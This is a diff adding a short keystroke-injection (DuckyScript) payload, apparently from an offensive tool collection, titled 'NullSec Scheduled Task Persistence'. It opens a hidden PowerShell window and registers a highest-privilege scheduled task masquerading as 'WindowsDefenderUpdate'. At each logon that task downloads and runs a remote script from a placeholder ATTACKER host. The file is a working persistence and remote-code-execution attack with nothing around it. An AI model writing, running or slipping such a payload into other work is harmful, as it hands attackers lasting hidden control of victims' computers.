@@ -1,0 +1,18 @@
+REM NullSec Scheduled Task Persistence
+REM Creates hidden scheduled task
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden
+ENTER
+DELAY 1000
+
+STRING $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w hidden -c `"IEX(New-Object Net.WebClient).downloadString('http://ATTACKER/payload.ps1')`""
+ENTER
+STRING $trigger = New-ScheduledTaskTrigger -AtLogOn
+ENTER
+STRING Register-ScheduledTask -TaskName "WindowsDefenderUpdate" -Action $action -Trigger $trigger -Description "Windows Defender Update Service" -RunLevel Highest
+ENTER
+STRING exit
+ENTER
